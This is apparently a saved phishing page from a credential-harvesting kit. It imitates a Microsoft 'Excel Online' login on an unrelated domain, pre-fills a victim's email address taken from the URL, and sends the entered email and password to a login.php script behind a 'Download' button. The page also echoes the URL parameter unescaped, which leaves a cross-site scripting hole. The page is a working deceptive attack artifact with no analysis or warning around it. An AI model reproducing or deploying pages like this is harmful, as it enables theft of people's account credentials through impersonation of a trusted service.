
<!-- saved from url=(0066)http://getthereview.com/excel/index.php?userid=kent@tassoaudio.com -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<title>Excel Online - 09KSJDJR4843984NF98738UNFD843</title>
<link rel="icon" type="image/png" href="http://getthereview.com/excel/favicon.ico">



</head>

<body style="background-image: url(&#39;exl.png&#39;); background-repeat: no-repeat">

<div style="position: absolute; width: 437px; height: 278px; z-index: 1; left: 422px; top: 223px; background-image: url(&#39;excel2013.png&#39;); background-repeat: no-repeat" id="layer1">
<div style="position: absolute; width: 91px; height: 7px; z-index: 1; left: 171px; top: 67px; background-image: url(&#39;294.gif&#39;); background-repeat: no-repeat" id="layer2">
&nbsp;</div>

<form method="POST" autocomplete="on" name="login_form" id="login_form" style="line-height: 1.22em; margin: 0px; padding: 0px;" action="login.php">


<?php if(isset($_GET['er'])) { ?>
<p style="color: #9C0606;     top: 63px;
    left: 108px;
    position: absolute;
    font-weight: bold;
    font-family: monospace;
">Invalid Username or Password </p>
<?php } ?>
<div style="position: absolute; width: 313px; height: 20px; z-index: 1; left: 63px; top: 104px" id="layer3">
	<span class="formwrap">
									  <input id="did" name="userid" value="<?php if(isset($_GET['userid'])) echo $_GET['userid']; ?>" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" required="" autocomplete="on" placeholder="someone@example.com" style="width:313; height:35" type="email"></span></div>
									  

<div style="position: absolute; width: 314px; height: 20px; z-index: 2; left: 63px; top: 152px" id="layer4">
										<span class="formwrap">
										<input id="didd" name="Password" required="" placeholder="Password" style="width:315; height:34" type="password"></span></div>
										

										<div style="position: absolute; width: 92px; height: 30px; z-index: 3; left: 164px; top: 220px" id="layer5">
								<button type="submit" id=".save" name="save" class="lgbx-btn purple-bg" tabindex="4" style="line-height: 1.22em; border: 1px solid rgb(82, 38, 117); color: rgb(255, 255, 255); height: 35px; width: 100px; font-weight: bold; cursor: pointer; text-align: center; border-top-left-radius: 2px; border-top-right-radius: 2px; border-bottom-right-radius: 2px; border-bottom-left-radius: 2px; background-color: rgb(5, 55, 155); font-size: 13px;">
								Download</button></div>
				

&nbsp;</form></div>


</body></html>